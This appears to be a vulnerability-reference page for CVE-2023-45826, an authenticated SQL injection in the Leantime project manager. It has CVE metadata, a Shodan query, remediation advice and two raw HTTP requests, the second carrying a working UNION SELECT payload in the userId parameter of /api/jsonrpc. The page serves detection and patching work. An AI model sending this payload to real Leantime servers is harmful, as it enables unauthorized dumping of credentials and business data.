---
layout: post
cve_id: CVE-2023-45826
title: Leantime < 2.4 - Authenticated SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-45826.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-45826.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: medium
impact: 'Authenticated attackers can exploit SQL injection through the userId parameter
  in the files API to dump database contents, potentially exposing project information,
  user credentials, and sensitive business data from the Leantime system.

  '
remediation: 'Update Leantime to version 2.4-beta-4 or later that uses parameterized
  queries for the userId variable in app/domain/files/repositories/class.files.php.

  '
reference:
- https://github.com/advisories/GHSA-c39w-3pjx-qc7m
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2023-45826
  cwe-id: CWE-89
  epss-score: 0.1359
  epss-percentile: 0.94008
  cpe: cpe:2.3:a:leantime:leantime:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: leantime
  product: leantime
  shodan-query: title:"Leantime"
tags:
- cve
- cve2023
- leantime
- authenticated
- sqli
- vuln
---

## ðŸ” Vulnerability Description
Leantime is an open source project management system. A 'userId' variable in `app/domain/files/repositories/class.files.php` is not parameterized. An authenticated attacker can send a carefully crafted POST request to `/api/jsonrpc` to exploit an SQL injection vulnerability. Confidentiality is impacted as it allows for dumping information from the database. This issue has been addressed in version 2.4-beta-4. Users are advised to upgrade. There are no known workarounds for this vulnerability.


## ðŸŒ HTTP Request
```nohighlight
POST /auth/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
Content-Length: 115
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
redirectUrl=http%253A%252F%252Fpdt.re%253A8080%252Fdashboard%252Fhome&username=GhDxLJ&password=SCMn1fzr&login=Login
```

```nohighlight
POST /api/jsonrpc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64, rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Content-Length: 219
Content-Type: application/json
Accept-Encoding: gzip
{"method": "leantime.rpc.files.getFilesByModule","jsonrpc": "2.0","id": "1","params": {"userId":"9 union select concat(0x333846307745624f5562746b4f346c4e3968527a77315735627462,0x3a,user()),2,3,4,5,6,7,8,9,10,11-- -" } }
```

